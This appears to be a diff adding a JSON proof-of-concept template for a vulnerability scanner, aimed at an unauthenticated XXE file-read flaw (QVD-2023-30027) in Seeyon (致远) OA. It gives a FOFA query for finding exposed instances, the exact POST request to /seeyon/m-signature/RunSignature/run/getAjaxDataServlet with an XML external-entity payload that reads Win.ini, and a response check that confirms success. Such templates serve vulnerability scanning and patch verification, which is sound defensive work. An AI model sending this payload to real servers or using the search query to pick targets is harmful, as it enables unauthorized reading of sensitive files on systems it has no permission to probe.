@@ -1,0 +1,43 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA getAjaxDataServlet XXE任意文件读取",
+  "type": "文件读取",
+  "vul_id": [
+    "QVD-2023-30027"
+  ],
+  "level": 3,
+  "vul_desc": "致远互联-OA getAjaxDataServlet 接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。",
+  "version": "V5/G6 V6.0及以上全系列版本",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"致远互联-OA\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_41904294/article/details/135447504",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet",
+      "data": {
+        "S": "ajaxColManager",
+        "M": "colDelLock",
+        "imgvalue": "lr7V9+0XCEhZ5KUijesavRASMmpz/JcFgNqW4G2x63IPfOy=YudDQ1bnHT8BLtwokmb/k",
+        "signwidth": "4.0",
+        "signheight": "4.0",
+        "xmlValue": "<?xml version=\"1.0\"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///C:/Windows/Win.ini\" >]><Signature><Field><a Index=\"ProtectItem\">true</a><b Index=\"Caption\">caption</b><c Index=\"ID\">id</c><d Index=\"VALUE\">&xxe;</d></Field></Signature>"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "encodeValue="
+        }
+      ]
+    }
+  }
+}
